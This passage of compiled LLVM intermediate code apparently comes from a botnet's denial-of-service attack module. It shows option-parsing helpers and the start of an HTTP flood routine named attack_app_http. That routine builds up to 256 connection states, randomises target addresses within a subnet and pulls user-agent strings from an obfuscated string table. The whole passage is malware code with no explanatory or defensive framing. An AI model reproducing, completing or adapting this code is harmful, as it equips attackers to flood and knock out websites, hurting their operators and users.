  %63 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %64 = load i8, i8* %11, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %61(i8 zeroext %62, %struct.attack_target* %63, i8 zeroext %64, %struct.attack_option* %65)
  br label %70

; <label>:66:                                     ; preds = %42
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %15, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %15, align 4
  br label %37

; <label>:70:                                     ; preds = %54, %37
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %36

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %33

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %5, align 4
  br label %10

; <label>:33:                                     ; preds = %10
  %34 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %35 = bitcast %struct.attack_option* %34 to i8*
  call void @free(i8* %35) #6
  br label %36

; <label>:36:                                     ; preds = %33, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %38

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %40

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %11

; <label>:38:                                     ; preds = %11
  %39 = load i8*, i8** %9, align 8
  store i8* %39, i8** %5, align 8
  br label %40

; <label>:40:                                     ; preds = %38, %27
  %41 = load i8*, i8** %5, align 8
  ret i8* %41
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 21, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 24, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  %85 = icmp eq i8* %84, null
  br i1 %85, label %89, label %86

; <label>:86:                                     ; preds = %4
  %87 = load i8*, i8** %17, align 8
  %88 = icmp eq i8* %87, null
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %86, %4
  br label %2445

; <label>:90:                                     ; preds = %86
  %91 = load i8*, i8** %17, align 8
  %92 = call i32 @util_strlen(i8* %91)
  %93 = icmp sgt i32 %92, 255
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %90
  br label %2445

; <label>:95:                                     ; preds = %90
  %96 = load i8*, i8** %16, align 8
  %97 = call i32 @util_strlen(i8* %96)
  %98 = icmp sgt i32 %97, 127
  br i1 %98, label %99, label %100

; <label>:99:                                     ; preds = %95
  br label %2445

; <label>:100:                                    ; preds = %95
  %101 = load i8*, i8** %15, align 8
  %102 = call i32 @util_strlen(i8* %101)
  %103 = icmp sgt i32 %102, 9
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  br label %2445

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %10, align 4
  br label %106

; <label>:106:                                    ; preds = %137, %105
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %15, align 8
  %109 = call i32 @util_strlen(i8* %108)
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %140

; <label>:111:                                    ; preds = %106
  %112 = load i8*, i8** %15, align 8
  %113 = load i32, i32* %10, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = sext i8 %116 to i32
  %118 = icmp sge i32 %117, 97
  br i1 %118, label %119, label %136

; <label>:119:                                    ; preds = %111
  %120 = load i8*, i8** %15, align 8
  %121 = load i32, i32* %10, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = icmp sle i32 %125, 122
  br i1 %126, label %127, label %136

; <label>:127:                                    ; preds = %119
  %128 = load i8*, i8** %15, align 8
  %129 = load i32, i32* %10, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %134 = sub nsw i32 %133, 32
  %135 = trunc i32 %134 to i8
  store i8 %135, i8* %131, align 1
  br label %136

; <label>:136:                                    ; preds = %127, %119, %111
  br label %137

; <label>:137:                                    ; preds = %136
  %138 = load i32, i32* %10, align 4
  %139 = add nsw i32 %138, 1
  store i32 %139, i32* %10, align 4
  br label %106

; <label>:140:                                    ; preds = %106
  %141 = load i32, i32* %18, align 4
  %142 = icmp sgt i32 %141, 256
  br i1 %142, label %143, label %144

; <label>:143:                                    ; preds = %140
  store i32 256, i32* %18, align 4
  br label %144

; <label>:144:                                    ; preds = %143, %140
  call void @table_unlock_val(i8 zeroext 52)
  call void @table_unlock_val(i8 zeroext 53)
  call void @table_unlock_val(i8 zeroext 54)
  call void @table_unlock_val(i8 zeroext 55)
  call void @table_unlock_val(i8 zeroext 56)
  call void @table_unlock_val(i8 zeroext 57)
  call void @table_unlock_val(i8 zeroext 58)
  call void @table_unlock_val(i8 zeroext 59)
  call void @table_unlock_val(i8 zeroext 60)
  call void @table_unlock_val(i8 zeroext 61)
  call void @table_unlock_val(i8 zeroext 62)
  %145 = load i32, i32* %18, align 4
  %146 = sext i32 %145 to i64
  %147 = call noalias i8* @calloc(i64 %146, i64 3140) #6
  %148 = bitcast i8* %147 to %struct.attack_http_state*
  store %struct.attack_http_state* %148, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %149

; <label>:149:                                    ; preds = %346, %144
  %150 = load i32, i32* %9, align 4
  %151 = load i32, i32* %18, align 4
  %152 = icmp slt i32 %150, %151
  br i1 %152, label %153, label %349

; <label>:153:                                    ; preds = %149
  %154 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %157, i32 0, i32 1
  store i8 0, i8* %158, align 4
  %159 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %160 = load i32, i32* %9, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %159, i64 %161
  %163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %162, i32 0, i32 0
  store i32 -1, i32* %163, align 4
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = load i8, i8* %5, align 1
  %167 = zext i8 %166 to i32
  %168 = srem i32 %165, %167
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %176, i32 0, i32 4
  store i32 %172, i32* %177, align 4
  %178 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %181, i32 0, i32 6
  %183 = getelementptr inbounds [257 x i8], [257 x i8]* %182, i32 0, i32 0
  %184 = load i8*, i8** %17, align 8
  %185 = call i32 @util_strcpy(i8* %183, i8* %184)
  %186 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %189, i32 0, i32 6
  %191 = getelementptr inbounds [257 x i8], [257 x i8]* %190, i64 0, i64 0
  %192 = load i8, i8* %191, align 4
  %193 = sext i8 %192 to i32
  %194 = icmp ne i32 %193, 47
  br i1 %194, label %195, label %223

; <label>:195:                                    ; preds = %153
  %196 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %199, i32 0, i32 6
  %201 = getelementptr inbounds [257 x i8], [257 x i8]* %200, i32 0, i32 0
  %202 = getelementptr inbounds i8, i8* %201, i64 1
  %203 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %204 = load i32, i32* %9, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %203, i64 %205
  %207 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %206, i32 0, i32 6
  %208 = getelementptr inbounds [257 x i8], [257 x i8]* %207, i32 0, i32 0
  %209 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %210 = load i32, i32* %9, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %212, i32 0, i32 6
  %214 = getelementptr inbounds [257 x i8], [257 x i8]* %213, i32 0, i32 0
  %215 = call i32 @util_strlen(i8* %214)
  %216 = sext i32 %215 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %202, i8* %208, i64 %216, i32 1, i1 false)
  %217 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %218 = load i32, i32* %9, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %217, i64 %219
  %221 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %220, i32 0, i32 6
  %222 = getelementptr inbounds [257 x i8], [257 x i8]* %221, i64 0, i64 0
  store i8 47, i8* %222, align 4
  br label %223

; <label>:223:                                    ; preds = %195, %153
  %224 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %225 = load i32, i32* %9, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %224, i64 %226
  %228 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %227, i32 0, i32 10
  %229 = getelementptr inbounds [9 x i8], [9 x i8]* %228, i32 0, i32 0
  %230 = load i8*, i8** %15, align 8
  %231 = call i32 @util_strcpy(i8* %229, i8* %230)
  %232 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %233 = load i32, i32* %9, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %232, i64 %234
  %236 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %235, i32 0, i32 9
  %237 = getelementptr inbounds [9 x i8], [9 x i8]* %236, i32 0, i32 0
  %238 = load i8*, i8** %15, align 8
  %239 = call i32 @util_strcpy(i8* %237, i8* %238)
  %240 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %241 = load i32, i32* %9, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %240, i64 %242
  %244 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %243, i32 0, i32 7
  %245 = getelementptr inbounds [129 x i8], [129 x i8]* %244, i32 0, i32 0
  %246 = load i8*, i8** %16, align 8
  %247 = call i32 @util_strcpy(i8* %245, i8* %246)
  %248 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %249 = load i32, i32* %9, align 4
  %250 = load i8, i8* %5, align 1
  %251 = zext i8 %250 to i32
  %252 = srem i32 %249, %251
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %248, i64 %253
  %255 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i32 0, i32 2
  %256 = load i8, i8* %255, align 4
  %257 = zext i8 %256 to i32
  %258 = icmp slt i32 %257, 32
  br i1 %258, label %259, label %289

; <label>:259:                                    ; preds = %223
  %260 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %261 = load i32, i32* %9, align 4
  %262 = load i8, i8* %5, align 1
  %263 = zext i8 %262 to i32
  %264 = srem i32 %261, %263
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %260, i64 %265
  %267 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %266, i32 0, i32 1
  %268 = load i32, i32* %267, align 4
  %269 = call i32 @ntohl(i32 %268) #7
  %270 = call i32 @rand_next()
  %271 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %272 = load i32, i32* %9, align 4
  %273 = load i8, i8* %5, align 1
  %274 = zext i8 %273 to i32
  %275 = srem i32 %272, %274
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i64 %276
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %277, i32 0, i32 2
  %279 = load i8, i8* %278, align 4
  %280 = zext i8 %279 to i32
  %281 = lshr i32 %270, %280
  %282 = add i32 %269, %281
  %283 = call i32 @htonl(i32 %282) #7
  %284 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %287, i32 0, i32 4
  store i32 %283, i32* %288, align 4
  br label %289

; <label>:289:                                    ; preds = %259, %223
  %290 = call i32 @rand_next()
  %291 = urem i32 %290, 5
  switch i32 %291, label %337 [
    i32 0, label %292
    i32 1, label %301
    i32 2, label %310
    i32 3, label %319
    i32 4, label %328
  ]

; <label>:292:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 63)
  %293 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %296, i32 0, i32 5
  %298 = getelementptr inbounds [512 x i8], [512 x i8]* %297, i32 0, i32 0
  %299 = call i8* @table_retrieve_val(i32 63, i32* null)
  %300 = call i32 @util_strcpy(i8* %298, i8* %299)
  call void @table_lock_val(i8 zeroext 63)
  br label %337

; <label>:301:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 64)
  %302 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %305, i32 0, i32 5
  %307 = getelementptr inbounds [512 x i8], [512 x i8]* %306, i32 0, i32 0
  %308 = call i8* @table_retrieve_val(i32 64, i32* null)
  %309 = call i32 @util_strcpy(i8* %307, i8* %308)
  call void @table_lock_val(i8 zeroext 64)
  br label %337

; <label>:310:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 65)
  %311 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %314, i32 0, i32 5
  %316 = getelementptr inbounds [512 x i8], [512 x i8]* %315, i32 0, i32 0
  %317 = call i8* @table_retrieve_val(i32 65, i32* null)
  %318 = call i32 @util_strcpy(i8* %316, i8* %317)
  call void @table_lock_val(i8 zeroext 65)
  br label %337

; <label>:319:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 66)
  %320 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %323, i32 0, i32 5
  %325 = getelementptr inbounds [512 x i8], [512 x i8]* %324, i32 0, i32 0
  %326 = call i8* @table_retrieve_val(i32 66, i32* null)
  %327 = call i32 @util_strcpy(i8* %325, i8* %326)
  call void @table_lock_val(i8 zeroext 66)
  br label %337

; <label>:328:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 67)
  %329 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %332, i32 0, i32 5
  %334 = getelementptr inbounds [512 x i8], [512 x i8]* %333, i32 0, i32 0
  %335 = call i8* @table_retrieve_val(i32 67, i32* null)
  %336 = call i32 @util_strcpy(i8* %334, i8* %335)
  call void @table_lock_val(i8 zeroext 67)
  br label %337

; <label>:337:                                    ; preds = %328, %319, %310, %301, %292, %289
  %338 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %339 = load i32, i32* %9, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %338, i64 %340
  %342 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %341, i32 0, i32 6
  %343 = getelementptr inbounds [257 x i8], [257 x i8]* %342, i32 0, i32 0
  %344 = load i8*, i8** %17, align 8
  %345 = call i32 @util_strcpy(i8* %343, i8* %344)
  br label %346

; <label>:346:                                    ; preds = %337
  %347 = load i32, i32* %9, align 4
  %348 = add nsw i32 %347, 1
  store i32 %348, i32* %9, align 4
  br label %149

; <label>:349:                                    ; preds = %149
  br label %350

; <label>:350:                                    ; preds = %2444, %960, %950, %349
  store i32 0, i32* %23, align 4
  %351 = call i64 @time(i64* null) #6
  %352 = trunc i64 %351 to i32
  store i32 %352, i32* %27, align 4
  br label %353

; <label>:353:                                    ; preds = %350
  %354 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %355 = getelementptr inbounds [16 x i64], [16 x i64]* %354, i64 0, i64 0
  %356 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %355) #6, !srcloc !1
  %357 = extractvalue { i64, i64* } %356, 0
  %358 = extractvalue { i64, i64* } %356, 1
  %359 = trunc i64 %357 to i32
  store i32 %359, i32* %28, align 4
  %360 = ptrtoint i64* %358 to i64
  %361 = trunc i64 %360 to i32
  store i32 %361, i32* %29, align 4
  br label %362

; <label>:362:                                    ; preds = %353
  br label %363

; <label>:363:                                    ; preds = %362
  %364 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %365 = getelementptr inbounds [16 x i64], [16 x i64]* %364, i64 0, i64 0
